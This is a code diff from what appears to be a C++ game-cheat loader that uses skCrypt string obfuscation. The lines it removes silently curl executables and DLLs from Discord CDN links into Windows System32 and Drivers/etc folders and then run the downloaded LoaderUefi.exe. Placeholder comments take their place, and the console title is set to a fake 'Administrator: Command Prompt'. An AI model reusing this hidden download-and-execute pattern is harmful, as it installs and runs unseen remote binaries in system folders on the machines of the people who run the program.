@@ -279,17 +279,11 @@ int milox;
 int main()
 {//
 	system(skCrypt("color e"));
-	system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1116438456101523528/1118209618229870682/museo.ttf --output c:/windows/fonts/museo.ttf >nul 2>&1"));
-	system(skCrypt("curl https://cdn.discordapp.com/attachments/1115912162628612136/1116343931169407058/LoaderUefi.exe -o C:/Windows/System32/Drivers/etc/LoaderUefi.exe --silent"));
-	system(skCrypt("curl https://cdn.discordapp.com/attachments/1115912162628612136/1116343939461546024/Intel.dll -o C:/Windows/System32/Drivers/etc/Intel.dll --silent"));
-	system(skCrypt("curl https://cdn.discordapp.com/attachments/1115912162628612136/1116343948617728000/Amd.dll -o C:/Windows/System32/Drivers/etc/Amd.dll --silent"));
+	// add museo.ttf font (neverlose font) download here
 	Memory.Initialize();
 	if (!Memory.Initialize()) {
 		printf(skCrypt("Prerequisties not loaded, rebooting. If the error persists contact support. \n"));
-		system(skCrypt("curl https://cdn.discordapp.com/attachments/1120001169201320077/1120007650185318461/LoaderUefi.exe -o C:/Windows/System32/LoaderUefi.exe --silent >nul"));
-		system(skCrypt("curl https://cdn.discordapp.com/attachments/1120001169201320077/1120007657445658744/Intel.dll -o C:/Windows/System32/Intel.dll --silent >nul"));
-		system(skCrypt("curl https://cdn.discordapp.com/attachments/1120001169201320077/1120007673111388241/Amd.dll -o C:/Windows/System32/Amd.dll --silent >nul"));
-		system(skCrypt("C:/Windows/System32/LoaderUefi.exe"));
+		// add pasteager loader here
 	}
 	SetConsoleTitleA("Administrator: Command Prompt");
 	system(skCrypt("cls"));
